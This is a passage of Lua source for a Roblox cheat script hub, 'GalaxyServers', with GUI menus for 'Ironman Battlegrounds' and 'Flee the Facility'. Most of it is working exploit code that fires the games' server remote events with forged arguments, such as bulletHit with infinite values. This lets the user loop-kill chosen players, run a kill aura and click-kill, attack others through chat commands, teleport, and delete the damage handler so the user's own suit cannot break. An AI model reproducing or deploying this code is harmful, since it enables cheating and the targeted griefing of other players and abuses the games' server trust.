    local Label = chat:AddLabel("<> Rocket <name>")

    local Label = chat:AddLabel("<> LoopBeam <name>")

    local Label = chat:AddLabel("<> LoopRocket <name>")

    local Label = buyer:AddLabel("<> Shutdown <name>")

    local Label = buyer:AddLabel("<> Hack <name>")

    local Label = buyer:AddLabel("<> Hell <name>")

    local Label = buyer:AddLabel("<> Ghcheck")

    local Label = buyer:AddLabel("<> Kill <name>")

    local Label = buyer:AddLabel("<> Bring <name>")

    local Label = buyer:AddLabel("<> Freeze <name>")

    local Label = buyer:AddLabel("<> Unfr <name>")

    local Label = buyer:AddLabel("<> Rejoin <name>")

    local Label = buyer:AddLabel("<> Crip <name>")

    local Label = buyer:AddLabel("<> Nuke <name>")

    local Label = buyer:AddLabel("<> Snek <name>")

    local Label = buyer:AddLabel("<> Scp <name>")

    local Label = buyer:AddLabel("<> Expose <name>")

    local Picker = gui:AddPicker("UI Theme Colour", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        Window:SetAccent(color)
    end)

    local Label = gui:AddLabel("LeftControl to minimize UI")

    local ClipboardLabel = gui:AddClipboardLabel("Copy Discord Server link", function()
        return "https://discord.gg/vCmtKwSE7w"
    end)

    local function GetPlayer(String)
        local plr
        local strl = String:lower()
            for i, v in pairs(game:GetService("Players"):GetPlayers()) do
                if v.Name:lower():sub(1, #String) == String:lower() then
                    plr = v
                end
            end
            if String == "" or String == " " then
                plr = nil
            end
        return plr
    end

    local prefix = ","

    game.Players.LocalPlayer.Chatted:connect(function(msg)
        msg = msg:lower()
        if string.sub(msg,1,3) == "/e " then
            msg = string.sub(msg,4)
        end
        if string.sub(msg,1,1) == prefix then
            local cmd
            local space = string.find(msg," ")
            if space then
                cmd = string.sub(msg,2,space-1)
            else
                cmd = string.sub(msg,2)
            end 
            if cmd == "to" then
                local var = string.sub(msg,space+1)
                local target = GetPlayer(var)
                local args = {
                    [1] = CFrame.new(target.Character.HumanoidRootPart.Position)
                }
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = unpack(args)
            end
            if cmd == "beatterry" then
                print("clap terry command")
            end
            if cmd == "beam" then
                local var = string.sub(msg,space+1)
                local target = GetPlayer(var)
                local g
                g = game:service('RunService').Stepped:connect(function()
                    if target.Character.Humanoid.Health == 0 then
                        return g:Disconnect()
                    end
                    local args = {
                        [1] = {
                            ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                        }
                    }
                    game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                    
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.repulsorBeam,
                            ["hitPart"] = target.Character.HumanoidRootPart,
                            ["hitPos"] = target.Character.HumanoidRootPart.Position,
                            ["hitNormal"] = target.Character.HumanoidRootPart.Position
                        }
                    }
                    game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))                
                end)
            end
            if cmd == "rocket" then
                local var = string.sub(msg,space+1)
                local target = GetPlayer(var)
                local g
                g = game:service('RunService').Stepped:connect(function()
                    if target.Character.Humanoid.Health == 0 then
                        return g:Disconnect()
                    end
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = target.Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = target.Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))            
                end)
            end
            local loopbeam = true
            if cmd == "loopbeam" then
                local var = string.sub(msg,space+1)
                local target = GetPlayer(var)
                local g
                g = game:service('RunService').Stepped:connect(function()
                    if beam == false then
                        return g:Disconnect()
                    end
                    local args = {
                        [1] = {
                            ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                        }
                    }
                    game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                    
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.repulsorBeam,
                            ["hitPart"] = target.Character.HumanoidRootPart,
                            ["hitPos"] = target.Character.HumanoidRootPart.Position,
                            ["hitNormal"] = target.Character.HumanoidRootPart.Position
                        }
                    }
                    game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))                
                end)
            elseif cmd == "unloopbeam" then
                beam = false
            end
            local rocket = true
            if cmd == "looprocket" then
                local var = string.sub(msg,space+1)
                local target = GetPlayer(var)
                local g
                g = game:service('RunService').Stepped:connect(function()
                    if rocket == false then
                        return g:Disconnect()
                    end
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = target.Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = target.Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))            
                end)
            elseif cmd == "unlooprocket" then
                rocket = false
            end
        end      
    end)
end

function IronManBattlegrounds()
    local Symmetrical = Library:AddWindow({
        title = {"GalaxyServers", "Ironman Battlegrounds"},
        theme = {
            Accent = Color3.fromRGB(255,105,180)
        },
        key = Enum.KeyCode.RightControl,
        default = true
    })
    local general = Symmetrical:AddTab("General", {default = false})
    local pee = general:AddSection("Combat", {default = false})
    local ff = general:AddSection("Suit", {default = false})
    local click = general:AddSection("Clicks", {default = false})
    local auras = general:AddSection("Auras", {default = false})
    
    local boxtarget = nil
    local value = false
    local Toggle = pee:AddToggle("Loopkill", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                local args = {
                    [1] = game:GetService("Players")[boxtarget].Character.HumanoidRootPart,
                    [2] = Vector3.new(0,math.huge,0),
                    [3] = Vector3.new(0,math.huge,0)
                }
                
                game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
                local args = {
                    [1] = game:GetService("Players")[boxtarget].Character.HumanoidRootPart,
                    [2] = Vector3.new(0,math.huge,0),
                    [3] = Vector3.new(0,math.huge,0)
                }
                
                game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
                local args = {
                    [1] = game:GetService("Players")[boxtarget].Character.HumanoidRootPart,
                    [2] = Vector3.new(0,math.huge,0),
                    [3] = Vector3.new(0,math.huge,0)
                }
                
                game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
                local args = {
                    [1] = game:GetService("Players")[boxtarget].Character.HumanoidRootPart,
                    [2] = Vector3.new(0,math.huge,0),
                    [3] = Vector3.new(0,math.huge,0)
                }
                
                game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
                local args = {
                    [1] = game:GetService("Players")[boxtarget].Character.HumanoidRootPart,
                    [2] = Vector3.new(0,math.huge,0),
                    [3] = Vector3.new(0,math.huge,0)
                }
                
                game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
                local args = {
                    [1] = game:GetService("Players")[boxtarget].Character.HumanoidRootPart,
                    [2] = Vector3.new(0,math.huge,0),
                    [3] = Vector3.new(0,math.huge,0)
                }
                
                game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
            end)
        end
    end)
    
    local value = false
    local Toggle = pee:AddToggle("LoopBeam", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                local args = {
                    [1] = "RightHand",
                    [2] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                }
    
                game:GetService("ReplicatedStorage").Events.Shoot:FireServer(unpack(args))
                local args = {
                    [1] = "RightHand",
                    [2] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                }
    
                game:GetService("ReplicatedStorage").Events.Shoot:FireServer(unpack(args))
                local args = {
                    [1] = "RightHand",
                    [2] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                }
    
                game:GetService("ReplicatedStorage").Events.Shoot:FireServer(unpack(args))
                local args = {
                    [1] = "RightHand",
                    [2] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                }
    
                game:GetService("ReplicatedStorage").Events.Shoot:FireServer(unpack(args))
                local args = {
                    [1] = "RightHand",
                    [2] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                }
    
                game:GetService("ReplicatedStorage").Events.Shoot:FireServer(unpack(args))
                local args = {
                    [1] = "RightHand",
                    [2] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                }
    
                game:GetService("ReplicatedStorage").Events.Shoot:FireServer(unpack(args))
            end)
        end
    end)
    
    local value = false
    local Toggle = pee:AddToggle("LoopHarmless", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                spawn(function()
                    local args = {
                        [1] = game.Players[boxtarget].Character.Suit.LeftHand.Union,
                        [2] = Vector3.new(0,math.huge,0),
                        [3] = Vector3.new(0,math.huge,0)
                    }
                    
                    game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
                end)
                wait(2.3)
                spawn(function()
                    local args = {
                        [1] = game.Players[boxtarget].Character.Suit.RightHand.Union,
                        [2] = Vector3.new(0,math.huge,0),
                        [3] = Vector3.new(0,math.huge,0)
                    }
                    
                    game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
                end)
                wait(2.3)
                spawn(function()
                    local args = {
                        [1] = game.Players[boxtarget].Character.Suit.UpperTorso.Union,
                        [2] = Vector3.new(0,math.huge,0),
                        [3] = Vector3.new(0,math.huge,0)
                    }
                    
                    game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))    
                end)            
                wait(2.3)
            end)
        end
    end)
    
    local value = false
    local Toggle = pee:AddToggle("LoopLaser", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[boxtarget].Character.HumanoidRootPart.Position)
                local args = {
                    [1] = true,
                    [2] = "RightHand"
                }
    
                game:GetService("ReplicatedStorage").Events.Laser:InvokeServer(unpack(args))
                local args = {
                    [1] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                }
    
                game:GetService("ReplicatedStorage").Events.Hit:FireServer(unpack(args))
            end)
        end
    end)
    
    local Box = pee:AddBox("Select a Player", {fireonempty = true}, function(text)
        boxtarget = text
    end)
    
    local Toggle = pee:AddToggle("Spam Landing Sound", {flag = "Toggle_Flag", default = false}, function(s)
        groundcrack = s
        if groundcrack then 
            local refresh
            refresh = game:service('RunService').Stepped:connect(function() 
                if not groundcrack then 
                    return refresh:Disconnect() 
                end 
                pcall(function()
                    game:GetService("ReplicatedStorage").Events.Land:FireServer()
                end)
            end)
        end
    end)
    
    local value = false
    local Toggle = pee:AddToggle("No Sit", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                pcall(function()
                    game.Players.LocalPlayer.Character.Humanoid.Sit = false
                end)
            end)
        end
    end)
    
    local Toggle = ff:AddToggle("Instantly Wear Suit", {flag = "Toggle_Flag", default = false}, function(s)
        wsuit = s
        if wsuit then 
            local refresh
            refresh = game:service('RunService').Stepped:connect(function() 
                if not wsuit then 
                    return refresh:Disconnect() 
                end 
                pcall(function()
                    spawn(function()
                        local args = {
                            [1] = "LeftHand"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()
                    local args = {
                            [1] = "RightFoot"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()
                        local args = {
                            [1] = "LeftLowerArm"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()    
                    local args = {
                            [1] = "RightLowerLeg"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()
                        local args = {
                            [1] = "RightUpperLeg"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()    
                        local args = {
                            [1] = "LeftUpperArm"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()
                        local args = {
                            [1] = "LowerTorso"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()
                        local args = {
                            [1] = "RightUpperArm"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                        spawn(function()
                        local args = {
                            [1] = "UpperTorso"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()    
                    local args = {
                            [1] = "Helmet"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()
                        local args = {
                            [1] = "LeftUpperLeg"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()
                        local args = {
                            [1] = "LeftLowerLeg"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()
                        local args = {
                            [1] = "RightLowerArm"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()
                        local args = {
                            [1] = "RightHand"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()
                        local args = {
                            [1] = "LeftFoot"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                    spawn(function()
                        local args = {
                            [1] = "Mask"
                        }
                        
                        game:GetService("ReplicatedStorage").Events.Attach:InvokeServer(unpack(args))
                    end)
                end)
            end)
        end
    end)
    
    local UniBeamToggle = false
    function chromeList(list)
        table.foreach(list,function(a,v)
            if v then
                local Option = v
                Option = string.gsub(Option,' ','')
                local lp = game.Players.LocalPlayer
                local lpb = lp.Backpack
                local lpc = lp.Character
                if lpc:FindFirstChild'Suit' then
                    for _,v in pairs(lpc.Suit:GetChildren()) do
                        if v.Name == Option then
                            local ms = v:GetChildren()
                            for _,v in pairs(ms) do
                                if v.Name == 'Union' then
                                    v:Destroy()
                                elseif v.Name == 'Part' then
                                    if v.Parent ~= lpc.Suit.UpperTorso then
                                        v:Destroy()
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end)
    end
    
    ff:AddButton("Chrome suit", function()
        chromeList({
            'Upper Torso',
            'Lower Torso',
            'Left Upper Arm',
            'Right Upper Arm',
            'Left Lower Arm',
            'Right Lower Arm',
            'Left Hand',
            'Right Hand',
            'Left Upper Leg',
            'Right Upper Leg',
            'Left Lower Leg',
            'Right Lower Leg',
            'Left Foot',
            'Right Foot',
        })
    end)
    
    local value = false
    local Toggle = ff:AddToggle("Auto Chrome Suit", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                pcall(function()
                    chromeList({
                        'Upper Torso',
                        'Lower Torso',
                        'Left Upper Arm',
                        'Right Upper Arm',
                        'Left Lower Arm',
                        'Right Lower Arm',
                        'Left Hand',
                        'Right Hand',
                        'Left Upper Leg',
                        'Right Upper Leg',
                        'Left Lower Leg',
                        'Right Lower Leg',
                        'Left Foot',
                        'Right Foot',
                    })
                end)
            end)
        end
    end)
    
    local value = false
    local Toggle = ff:AddToggle("Auto Remove Helmet", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                pcall(function()
                    game.Players.LocalPlayer.Character.Suit.Helmet:remove()
                    game.Players.LocalPlayer.Character.Suit.Mask:remove()
                end)
            end)
        end
    end)
    
    local Toggle = ff:AddToggle("'T' to beam", {flag = "Toggle_Flag", default = false}, function(s)
        UniBeamToggle = s
    end)
    
    local KeyDown = false
    function laser()
    game:service('RunService').Heartbeat:connect(function(s)
    if KeyDown == true then
    if UniBeamToggle == true then
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
    
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
    
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
    
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
    
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
    end
    end
    end)
    game:service('RunService').Heartbeat:connect(function(s)
    if KeyDown == true then
    if UniBeamToggle == true then
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
        
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
        
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
        
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
        
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
    end
    end
    end)
    game:service('RunService').Heartbeat:connect(function(s)
    if KeyDown == true then
    if UniBeamToggle == true then
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
        
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
        
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
        
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
        local args = {
            [1] = game.Players.LocalPlayer:GetMouse().Target,
            [2] = game.Players.LocalPlayer:GetMouse().hit.p,
            [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        }
        
        game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
    end
    end
        end)
    end
    local x = 0
    local me = game.Players.LocalPlayer.Name
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:connect(function (key)
    if(key:byte() == 116) then
    KeyDown = true;
    Player = game:GetService("Players").LocalPlayer.Name
    AnimationId = "1746432470"
    local Anim = Instance.new("Animation")
    Anim.AnimationId = "rbxassetid://"..AnimationId
    local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
    if UniBeamToggle == true then
    k:Play() 
    k:AdjustSpeed(1)
    end
    if x ~= 1 then
        laser()
        x = x +1
    end
    while wait() do
        if KeyDown == false then
            k:Stop()
            end
        end
    end
    end)
    mouse.KeyUp:connect(function (key)
    if(key:byte() == 116) then
    KeyDown = false;
    end
    end)
    
    ff:AddButton("Unbreakable Suit", function()
        game.Players.LocalPlayer.Character.Suit.damageEvent:Destroy()
    end)
    
    local value = false
    local Toggle = ff:AddToggle("Auto Uunbreakable Suit", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                pcall(function()
                    game.Players.LocalPlayer.Character.Suit.damageEvent:Destroy()
                end)
            end)
        end
    end)
    
    ff:AddSlider("Flight Speed", 1, 2000, 500, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(val)
        local r = require(game:GetService("ReplicatedStorage").Modules.SuitModule)
    
        for a=2,40 do
            pcall(function()
                r['Mark '..a]["Flight Speed"] = val
            end)
        end
    end)
    
    local clickbeam = false
    local Toggle = click:AddToggle("Click Kill", {flag = "cbeam", default = false}, function(s)
        clickbeam = s
        if s then
            if not clickbeam then
                return
            end
            while clickbeam do
                wait()
                local p,cd,cam = game:service('Players').LocalPlayer,math.huge,workspace.CurrentCamera
                local mouse = p:GetMouse()
                mouse.Button1Down:connect(function()
                    if clickbeam == true then
                        for a,v in next, game:service('Players'):GetChildren() do
                            if v ~= p then
                                pcall(function()
                                    local a,a2 = cam:WorldToScreenPoint(v.Character.PrimaryPart.Position)
                                    if a2 then 
                                        local dist = (Vector2.new(a.X,a.Y)-Vector2.new(mouse.X,mouse.Y)).magnitude
                                        if dist < _G.volume then
                                            local g
                                            g = game:service('RunService').Stepped:connect(function()
                                                if v.Character.Humanoid.Health == 0 then
                                                    return g:Disconnect()
                                                end
                                                local args = {
                                                    [1] = v.Character.HumanoidRootPart,
                                                    [2] = Vector3.new(0,math.huge,0),
                                                    [3] = Vector3.new(0,math.huge,0)
                                                }
                                                
                                                game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))
                                            end)
                                        end
                                    end
                                end)
                            end
                        end
                    end
                end)
                return
            end
        end
    end)
    
    local ClickCircle = Drawing.new('Circle')
    ClickCircle.Radius = 90
    ClickCircle.Filled = false
    ClickCircle.NumSides = 200
    ClickCircle.Transparency = 0.5
    ClickCircle.Color = Color3.new(1,1,1)
    local value = false
    local Toggle = click:AddToggle("FOV Circle", {flag = "fovc", default = false}, function(s)
        value = s
        if not value then
            ClickCircle.Visible = false
            return
        end
        if s then
            ClickCircle.Thickness = 1.7
            ClickCircle.Visible = true
            local player = game:service('Players').LocalPlayer 
            local mouse = player:GetMouse()
            mouse.Move:connect(function()
                ClickCircle.Position = Vector2.new(mouse.X,mouse.Y+35)
            end)
        end
    end)
    
    _G.volume = 90
    local Slider = click:AddSlider("FOV Size", 10, 200, 90, {toggleable = false, default = false, flag = "slider1", fireontoggle = true, fireondrag = true, rounded = true}, function(val, bool)
        _G.volume = val
        ClickCircle.Radius = val
    end)
    
    local value = false
    local Toggle = click:AddToggle("Fill FOV Circle", {flag = "fcircle", default = false}, function(s)
        value = s
        if not value then
            ClickCircle.Filled = false
            return
        end
        if s then
            ClickCircle.Filled = true
        end
    end)
    
    local Picker = click:AddPicker("Color", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        ClickCircle.Color = color
    end)
    
    local value = false
    local Toggle = auras:AddToggle("Kill Aura", {flag = "Toggle_Flag", default = false}, function(s)
    value = s
    if s then
        local g = game:service('RunService').Stepped:connect(function()
            if not value then
                return g:Disconnect()
            end
            pcall(function()
                for i,v in pairs(game.Players:GetPlayers()) do
                    if v ~= game.Players.LocalPlayer then
                        pcall(function()
                            if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= AuraSize then
                                local args = {
                                    [1] = v.Character.HumanoidRootPart,
                                    [2] = Vector3.new(0,math.huge,0),
                                    [3] = Vector3.new(0,math.huge,0)
                                }
                                
                                game:GetService("ReplicatedStorage").Events.bulletHit:FireServer(unpack(args))  
                            end
                        end)
                    end
                end
            end)
        end)
    end
    end)
    
    local Slider = auras:AddSlider("Aura Size", 5, 200, 5, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(value)
        AuraSize = value
    end)
    
    local Player = Symmetrical:AddTab("Local Player", {default = false})
    local mainPlayer = Player:AddSection("Safe", {default = false})
    local Part = Instance.new("Part",game.Workspace)
    Part.Name = "Symmetrical"
    Part.Position = Vector3.new(920, 304, -2888)
    Part.Anchored = true
    Part.Size = Vector3.new(55, 5, 55)
    Part.Transparency = 0.9
    Part.TopSurface = Enum.SurfaceType.Studs
    Part.BottomSurface = Enum.SurfaceType.Studs
    local Button = mainPlayer:AddButton("Safe-zone", function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(920, 304, -2888)
    end)
    
    local Button = mainPlayer:AddButton("Leave safe-zone", function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-143, 40, 1141)
    end)
    
    local Misc = Symmetrical:AddTab("Misc", {default = false})
    local generalMisc = Misc:AddSection("General", {default = false})
    
    generalMisc:AddPicker("UI Theme Colour", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        Window:SetAccent(color)
    end)
    
    generalMisc:AddLabel("LeftControl to minimize UI")
    
    local ClipboardLabel = generalMisc:AddClipboardLabel("Copy Discord Server link", function()
        return "https://discord.gg/vCmtKwSE7w"
    end)
end

function FleetheFacility()
    -- Create Window
    local Window = Library:AddWindow({
        title = {"GalaxyServers", "Flee the Facility"},
        theme = {
            Accent = Color3.fromRGB(255,105,180)
        },
        key = Enum.KeyCode.LeftControl,
        default = true
    })

    -- Create Tab
    local Main = Window:AddTab("Beast", {default = false})
    local generalMain = Main:AddSection("General", {default = false})

    local Player = Window:AddTab("Player", {default = false})
    local generalPlayer = Player:AddSection("General", {default = false})

    local Universal = Window:AddTab("Universal", {default = false})
    local Esp = Universal:AddSection("Visuals", {default = false})

    local generalCamera = Universal:AddSection("Camera", {default = false})

    local Misc = Window:AddTab("Misc", {default = false})
    local generalMisc = Misc:AddSection("General", {default = false})

    local value = false
    local Toggle = generalMain:AddToggle("Remove Jump Fatique", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                local player = game.Players.LocalPlayer
                local character = player.Character
                local workspace = game.Workspace
                character.Humanoid.JumpPower = 36
            end)
        end
    end)

    local asdw = false
    local Toggle = generalMain:AddToggle("Enable Crawling", {flag = "Toggle_Flag", default = false}, function(s)
        asdw = s
        game:service('RunService').Stepped:connect(function(s)
            if asdw == true then
                if game:GetService("Players").LocalPlayer.TempPlayerStatsModule.IsBeast.Value == true then
                    game:GetService("Workspace")[game.Players.LocalPlayer.Name].CrawlScript.Disabled = false
                end
            else
                if game:GetService("Players").LocalPlayer.TempPlayerStatsModule.IsBeast.Value == true then
                    game:GetService("Workspace")[game.Players.LocalPlayer.Name].CrawlScript.Disabled = true
                end
            end
        end)
    end)

    local value = false
    local Toggle = generalMain:AddToggle("No Hit Stun", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                local player = game.Players.LocalPlayer
                local character = player.Character
                local workspace = game.Workspace
                character.Ragdoller:remove()
            end)
        end
    end)

    local value = false
    local Toggle = generalMain:AddToggle("No Gem Glow", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                if game:GetService("Players").LocalPlayer.TempPlayerStatsModule.IsBeast.Value == true then
                    if noglow == true then
                        game:GetService("Workspace")[game.Players.LocalPlayer.Name].Gemstone.Handle.PointLight:remove()
                    end
                end
            end)
        end
    end)

    local value = false
    local Toggle = generalMain:AddToggle("No Hammer Sound", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                local player = game.Players.LocalPlayer
                local character = player.Character
                for _, v in pairs(game:GetService("Workspace")[player.Name].Hammer.Handle:GetChildren()) do
                    if v:IsA("Sound") then
                        v:Destroy()
                    end
                end
            end)
        end
    end)

    local value = false
    local Toggle = generalPlayer:AddToggle("No Ragdoll", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                local player = game.Players.LocalPlayer
                local character = player.Character
